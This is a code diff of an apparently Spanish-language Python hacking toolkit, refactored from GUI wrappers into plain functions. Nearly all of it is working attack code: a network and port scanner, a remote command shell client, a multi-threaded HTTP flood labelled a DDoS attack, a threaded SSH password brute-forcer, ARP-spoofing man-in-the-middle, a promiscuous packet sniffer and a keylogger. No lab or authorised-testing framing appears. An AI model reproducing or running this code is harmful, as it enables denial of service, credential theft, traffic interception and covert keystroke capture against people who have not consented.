@@ -1,366 +1,274 @@
+import nmap
+import netifaces
+import ipaddress
+import logging
 import threading
 from concurrent.futures import ThreadPoolExecutor
 import time
-import nmap
-import netifaces
-from tkinter import messagebox
-from socket import socket, AF_INET, SOCK_STREAM
-import keyboard
 import scapy.all as scapy
 import paramiko
 import os
-import threading
-import time
-from utils import mostrar_resultado_con_descarga
+from socket import socket, AF_INET, SOCK_STREAM, gethostbyname, gaierror
+import keyboard
 
-# 1. Funciones de escaneo de red
-def get_network_range():
+# Configuración básica de logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Constantes
+MAX_THREADS = 10
+DEFAULT_TIMEOUT = 5
+SNIFFER_PACKET_LIMIT = 200
+
+def validate_ip(ip):
+    """Valida una dirección IP"""
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+def get_network_range(interface=None):
     """Obtiene el rango de red automáticamente"""
     try:
         interfaces = netifaces.interfaces()
-        for interface in interfaces:
-            if interface == "lo":
-                continue
-            addresses = netifaces.ifaddresses(interface)
-            if netifaces.AF_INET in addresses:
-                ip_info = addresses[netifaces.AF_INET][0]
-                ip = ip_info.get('addr', '')
-                netmask = ip_info.get('netmask', '')
-                if ip and netmask:
-                    ip_parts = list(map(int, ip.split('.')))
-                    mask_parts = list(map(int, netmask.split('.')))
-                    network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
-                    return f"{'.'.join(map(str, network_parts))}/24"
-        return None
+        target_interface = interface if interface else interfaces[1]
+        
+        if target_interface not in interfaces:
+            logger.error(f"Interfaz {target_interface} no encontrada")
+            return None
+            
+        addresses = netifaces.ifaddresses(target_interface)
+        if netifaces.AF_INET not in addresses:
+            logger.error("No hay configuración IPv4")
+            return None
+            
+        ip_info = addresses[netifaces.AF_INET][0]
+        network = ipaddress.IPv4Network(f"{ip_info['addr']}/{ip_info['netmask']}", strict=False)
+        return str(network)
+        
     except Exception as e:
-        messagebox.showerror("Error", f"Error al obtener rango de red: {str(e)}")
+        logger.error(f"Error: {str(e)}")
         return None
 
-def scan_ports(ip, start_port=1, end_port=1024):
-    """Escanea puertos en un rango específico"""
+def scan_ports(target, ports="1-1024", scan_type="-sS"):
+    """Escanea puertos con Nmap"""
     try:
+        if not validate_ip(target):
+            raise ValueError("IP inválida")
+            
         nm = nmap.PortScanner()
-        nm.scan(hosts=ip, ports=f"{start_port}-{end_port}", arguments='-sS')
-        open_ports = []
-        for host in nm.all_hosts():
-            for proto in nm[host].all_protocols():
-                for port in nm[host][proto].keys():
-                    if nm[host][proto][port]['state'] == 'open':
-                        open_ports.append(port)
-        return open_ports
+        nm.scan(hosts=target, ports=ports, arguments=scan_type)
+        return sorted(
+            port for host in nm.all_hosts()
+            for proto in nm[host].all_protocols()
+            for port in nm[host][proto].keys()
+            if nm[host][proto][port]['state'] == 'open'
+        )
+        
     except Exception as e:
-        messagebox.showerror("Error", f"Error en escaneo: {str(e)}")
+        logger.error(f"Error: {str(e)}")
         return []
-
-def open_port_scanner(ip, start_port, end_port):
-    """Interfaz para el escaneo de puertos"""
-    if not ip:
-        messagebox.showerror("Error", "Ingrese una dirección IP")
-        return
-    
-    try:
-        start_port = int(start_port)
-        end_port = int(end_port)
-    except ValueError:
-        messagebox.showerror("Error", "Puertos deben ser números")
-        return
-    
-    open_ports = scan_ports(ip, start_port, end_port)
-    if open_ports:
-        result = f"Puertos abiertos en {ip} ({start_port}-{end_port}):\n{', '.join(map(str, open_ports))}"
-        mostrar_resultado_con_descarga("Resultados Escaneo", result, f"scan_{ip}.txt")
-    else:
-        messagebox.showinfo("Resultado", f"No se encontraron puertos abiertos en {ip}")
 
 def scan_network(ip_range=None):
-    """Escanea dispositivos en la red"""
+    """Escanea dispositivos en red"""
     try:
+        ip_range = ip_range or get_network_range()
         if not ip_range:
-            ip_range = get_network_range()
-            if not ip_range:
-                messagebox.showerror("Error", "No se pudo detectar el rango de red")
-                return []
-        
+            raise ValueError("Rango de red no disponible")
+            
         nm = nmap.PortScanner()
-        nm.scan(hosts=ip_range, arguments='-sn')
+        nm.scan(hosts=ip_range, arguments='-sn -PE -PA21,23,80,3389')
+        return [{
+            'ip': host,
+            'mac': nm[host]['addresses'].get('mac', 'Desconocida'),
+            'hostname': nm[host].hostnames()[0].get('name', 'Desconocido'),
+            'status': 'Activo'
+        } for host in nm.all_hosts()]
         
-        devices = []
-        for host in nm.all_hosts():
-            mac = nm[host]['addresses'].get('mac', 'Desconocida')
-            hostname = nm[host]['hostnames'][0].get('name', 'Desconocido')
-            devices.append({'ip': host, 'mac': mac, 'hostname': hostname})
-        return devices
     except Exception as e:
-        messagebox.showerror("Error", f"Error en escaneo de red: {str(e)}")
+        logger.error(f"Error: {str(e)}")
         return []
 
-def open_network_scan():
-    """Interfaz para escaneo de red"""
-    devices = scan_network()
-    if devices:
-        result = "Dispositivos encontrados:\n\n"
-        for device in devices:
-            result += f"IP: {device['ip']}\nMAC: {device['mac']}\nHostname: {device['hostname']}\n\n"
-        mostrar_resultado_con_descarga("Escaneo de Red", result, "network_scan.txt")
-    else:
-        messagebox.showinfo("Resultado", "No se encontraron dispositivos")
-
-# 2. Funciones de ataque
-def open_reverse_shell(ip):
-    """Establece una conexión de reverse shell"""
-    if not ip:
-        messagebox.showerror("Error", "Ingrese una dirección IP")
-        return
-    
-    messagebox.showinfo("Reverse Shell", f"Conectando a {ip}...")
-    
+def reverse_shell(target_ip, port=4444):
+    """Establece conexión inversa"""
     try:
-        s = socket(AF_INET, SOCK_STREAM)
-        s.connect((ip, 5000))
-        
-        while True:
-            cmd = input("$ ")
-            if cmd.lower() == 'exit':
-                s.send(cmd.encode())
-                s.close()
-                break
-            s.send(cmd.encode())
-            print(s.recv(4096).decode())
+        if not validate_ip(target_ip):
+            raise ValueError("IP inválida")
+            
+        with socket(AF_INET, SOCK_STREAM) as s:
+            s.settimeout(DEFAULT_TIMEOUT)
+            s.connect((target_ip, port))
+            
+            while True:
+                cmd = input("$ ")
+                if cmd.lower() in ('exit', 'quit'):
+                    s.sendall(cmd.encode())
+                    break
+                s.sendall(cmd.encode())
+                print(s.recv(4096).decode())
+                
     except Exception as e:
-        messagebox.showerror("Error", f"Conexión fallida: {str(e)}")
+        logger.error(f"Error: {str(e)}")
+        raise
 
-def ddos_attack(target_ip, target_port=80, duration=30):
-    """Ataque DDoS básico"""
+def ddos_attack(target, port=80, duration=30, threads=5):
+    """Ataque DDoS multi-hilo"""
     try:
+        target_ip = gethostbyname(target)
         end_time = time.time() + duration
-        while time.time() < end_time:
-            try:
-                s = socket(AF_INET, SOCK_STREAM)
-                s.connect((target_ip, target_port))
-                s.sendto(("GET / HTTP/1.1\r\n").encode(), (target_ip, target_port))
-                s.close()
-            except:
-                pass
+        
+        def attack():
+            while time.time() < end_time:
+                try:
+                    with socket(AF_INET, SOCK_STREAM) as s:
+                        s.settimeout(1)
+                        s.connect((target_ip, port))
+                        s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+                except:
+                    continue
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for _ in range(threads):
+                executor.submit(attack)
+                
+        return f"Ataque DDoS completado contra {target_ip}:{port}"
+                
+    except gaierror:
+        error = "No se pudo resolver el nombre de host"
+        logger.error(error)
+        return error
     except Exception as e:
-        messagebox.showerror("Error", f"Error en ataque DDoS: {str(e)}")
+        error = f"Error en DDoS: {str(e)}"
+        logger.error(error)
+        return error
 
-def open_ddos_attack(target_ip, target_port, duration):
-    """Interfaz para ataque DDoS"""
-    if not target_ip or not target_port or not duration:
-        messagebox.showerror("Error", "Complete todos los campos")
-        return
-    
+def ssh_bruteforce(target, username, wordlist, max_threads=5):
+    """Fuerza bruta SSH"""
     try:
-        target_port = int(target_port)
-        duration = int(duration)
-    except ValueError:
-        messagebox.showerror("Error", "Puerto y duración deben ser números")
-        return
-    
-    messagebox.showinfo("DDoS", f"Iniciando ataque a {target_ip}:{target_port} por {duration} segundos")
-    threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration), daemon=True).start()
-
-def brute_force_ssh(target_ip, username, wordlist_path, max_threads=5):
-    """Ataque de fuerza bruta a SSH"""
-    try:
-        if not os.path.exists(wordlist_path):
-            messagebox.showerror("Error", "Archivo de diccionario no encontrado")
-            return None
-        
-        with open(wordlist_path, 'r') as f:
-            passwords = [line.strip() for line in f]
-        
+        if not os.path.isfile(wordlist):
+            raise FileNotFoundError("Diccionario no encontrado")
+            
+        with open(wordlist, 'r', errors='ignore') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+            
         found = None
         lock = threading.Lock()
         
         def try_password(password):
             nonlocal found
-            if found:
-                return
-            
+            if found: return
+                
             try:
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target_ip, username=username, password=password, timeout=5)
+                ssh.connect(target, username=username, password=password, timeout=DEFAULT_TIMEOUT)
                 ssh.close()
                 with lock:
                     found = password
-            except:
+            except Exception:
                 pass
-        
+                
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             executor.map(try_password, passwords)
-        
-        return found
+            
+        return found if found else "Contraseña no encontrada"
+            
     except Exception as e:
-        messagebox.showerror("Error", f"Error en fuerza bruta: {str(e)}")
-        return None
+        error = f"Error en fuerza bruta: {str(e)}"
+        logger.error(error)
+        return error
 
-def open_brute_force(target_ip, username, wordlist_path):
-    """Interfaz para fuerza bruta"""
-    if not target_ip or not username or not wordlist_path:
-        messagebox.showerror("Error", "Complete todos los campos")
-        return
-    
-    if not os.path.exists(wordlist_path):
-        messagebox.showerror("Error", "Archivo de diccionario no encontrado")
-        return
-    
-    messagebox.showinfo("Fuerza Bruta", f"Iniciando ataque a {target_ip} con usuario '{username}'")
-    password = brute_force_ssh(target_ip, username, wordlist_path)
-    
-    if password:
-        mostrar_resultado_con_descarga(
-            "Fuerza Bruta - Éxito",
-            f"¡Contraseña encontrada!\n\nUsuario: {username}\nContraseña: {password}",
-            f"bruteforce_success_{target_ip}.txt"
-        )
-    else:
-        messagebox.showinfo("Resultado", "No se encontró la contraseña")
-
-def mitm_arp_spoof(target_ip, gateway_ip, interface="eth0"):
-    """Ataque MITM sin warnings y con manejo adecuado"""
+def mitm_attack(target_ip, gateway_ip, interface=None):
+    """Ataque MITM con ARP spoofing"""
     try:
-        # Obtener MACs una sola vez
         target_mac = scapy.getmacbyip(target_ip)
         gateway_mac = scapy.getmacbyip(gateway_ip)
+        stop_event = threading.Event()
         
-        if not target_mac or not gateway_mac:
-            raise ValueError("No se pudieron obtener direcciones MAC")
-
-        # Función para enviar paquetes ARP sin warnings
-        def send_arp(op, psrc, hwsrc, pdst, hwdst):
-            scapy.send(
-                scapy.ARP(
-                    op=op,
-                    psrc=psrc,
-                    hwsrc=hwsrc,
-                    pdst=pdst,
-                    hwdst=hwdst
-                ),
-                verbose=False,
-                iface=interface
-            )
-
-        # Restauración ARP
-        def restore():
-            send_arp(2, gateway_ip, gateway_mac, target_ip, target_mac)
-            send_arp(2, target_ip, target_mac, gateway_ip, gateway_mac)
-            messagebox.showinfo("MITM", "ARP restaurado")
-
-        # Hilo principal de spoofing
-        def spoof():
+        def restore_network():
+            """Restaura tablas ARP"""
+            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5)
+            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5)
+            
+        def arp_spoof():
+            """Envía paquetes ARP falsos"""
             try:
-                while getattr(threading.current_thread(), "running", True):
-                    send_arp(2, gateway_ip, gateway_mac, target_ip, target_mac)
-                    send_arp(2, target_ip, target_mac, gateway_ip, gateway_mac)
+                while not stop_event.is_set():
+                    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
+                    scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                     time.sleep(2)
             finally:
-                restore()
-
-        # Configurar y lanzar hilo
-        spoof_thread = threading.Thread(target=spoof)
-        spoof_thread.running = True
-        spoof_thread.daemon = True
-        spoof_thread.start()
+                restore_network()
+                
+        threading.Thread(target=arp_spoof, daemon=True).start()
+        return stop_event
         
-        return spoof_thread
     except Exception as e:
-        messagebox.showerror("Error MITM", str(e))
+        logger.error(f"Error: {str(e)}")
         return None
-def open_mitm_attack(target_ip, gateway_ip, interface):
-    """Interfaz para MITM"""
-    if not target_ip or not gateway_ip:
-        messagebox.showerror("Error", "Complete todos los campos")
-        return
-    
-    messagebox.showinfo("MITM", f"Iniciando ataque entre {target_ip} y {gateway_ip}")
-    threading.Thread(target=mitm_arp_spoof, args=(target_ip, gateway_ip, interface), daemon=True).start()
 
-# 3. Funciones de monitorización
-def sniff_packets(interface="eth0", timeout=30, filter=""):
-    """Captura paquetes de red de forma efectiva"""
+def packet_sniffer(interface=None, timeout=30, packet_filter="tcp or udp"):
+    """Captura paquetes de red"""
     try:
-        # Verificar permisos
         if os.geteuid() != 0:
-            messagebox.showerror("Error", "Se requieren privilegios de root para sniffing")
-            return []
-
-        # Configurar filtro básico si no se especifica
-        if not filter:
-            filter = "tcp or udp or icmp"
+            raise PermissionError("Se requieren privilegios de root para sniffing")
+            
+        packets = []
         
-        # Capturar paquetes con almacenamiento
-        packets = scapy.sniff(
+        def packet_callback(packet):
+            """Callback que procesa cada paquete capturado"""
+            packets.append(packet)
+            if len(packets) >= SNIFFER_PACKET_LIMIT:
+                raise KeyboardInterrupt("Límite de paquetes alcanzado")
+        
+        # Configuración importante para la captura
+        scapy.conf.verb = 0  # Desactiva mensajes de scapy
+        scapy.conf.sniff_promisc = 1  # Modo promiscuo
+        
+        # Captura los paquetes con parámetros mejorados
+        scapy.sniff(
             iface=interface,
             timeout=timeout,
-            filter=filter,
-            store=True,
-            prn=lambda x: x.summary()  # Mostrar resumen en tiempo real
+            filter=packet_filter,
+            prn=packet_callback,
+            store=0,  # No almacenar en memoria interna de scapy
+            monitor=False,  # Modo monitor solo si es compatible
+            count=0  # Captura continua hasta timeout
         )
         
-        return packets
-    except Exception as e:
-        messagebox.showerror("Error", f"Error en sniffer: {str(e)}")
-        return []
-
-def open_sniffer(interface, timeout):
-    """Interfaz mejorada para el sniffer"""
-    if not interface:
-        messagebox.showerror("Error", "Especifique una interfaz de red")
-        return
-    
-    try:
-        timeout = int(timeout)
-        if timeout <= 0:
-            raise ValueError
-    except ValueError:
-        messagebox.showerror("Error", "El tiempo debe ser un número positivo")
-        return
-    
-    # Ejecutar en un hilo para no bloquear la GUI
-    def run_sniffer():
-        packets = sniff_packets(interface, timeout)
-        if packets:
-            result = "Paquetes capturados:\n\n"
-            for pkt in packets[:200]:  # Limitar a 200 paquetes para no saturar
-                result += f"{pkt.summary()}\n"
-            mostrar_resultado_con_descarga("Resultados Sniffer", result, f"sniffer_{interface}.txt")
-        else:
-            messagebox.showinfo("Sniffer", "No se capturaron paquetes")
-    
-    threading.Thread(target=run_sniffer, daemon=True).start()
-def keylogger():
-    """Keylogger básico"""
-    log_file = "keylog.txt"
-    
-    def on_key(event):
-        with open(log_file, 'a') as f:
-            if event.name == 'space':
-                f.write(' ')
-            elif event.name == 'enter':
-                f.write('\n')
-            elif len(event.name) == 1:
-                f.write(event.name)
-            else:
-                f.write(f'[{event.name}]')
-    
-    try:
-        if os.path.exists(log_file):
-            os.remove(log_file)
+        return packets if packets else None
         
-        keyboard.on_press(on_key)
-        messagebox.showinfo("Keylogger", "Keylogger iniciado (F12 para detener)")
-        keyboard.wait('f12')
+    except PermissionError as e:
+        logger.error(f"Error de permisos: {str(e)}")
+        return None
+    except Exception as e:
+        logger.error(f"Error en sniffer: {str(e)}")
+        return None
+
+def keylogger(output_file="keylog.txt", stop_key='f12'):
+    """Registra pulsaciones de teclado"""
+    try:
+        if os.path.exists(output_file):
+            os.remove(output_file)
+            
+        def on_key_event(event):
+            with open(output_file, 'a') as f:
+                if event.event_type == 'down':
+                    f.write(
+                        ' ' if event.name == 'space' else
+                        '\n' if event.name == 'enter' else
+                        f'[{event.name.upper()}]' if len(event.name) > 1 else
+                        event.name
+                    )
+                        
+        keyboard.hook(on_key_event)
+        keyboard.wait(stop_key)
         keyboard.unhook_all()
         
-        with open(log_file, 'r') as f:
-            data = f.read()
-        
-        mostrar_resultado_con_descarga(
-            "Keylogger - Datos Capturados",
-            data,
-            "keylogger_data.txt"
-        )
+        with open(output_file, 'r') as f:
+            return f.read()
+            
     except Exception as e:
-        messagebox.showerror("Error", f"Error en keylogger: {str(e)}")
+        logger.error(f"Error: {str(e)}")
+        return None
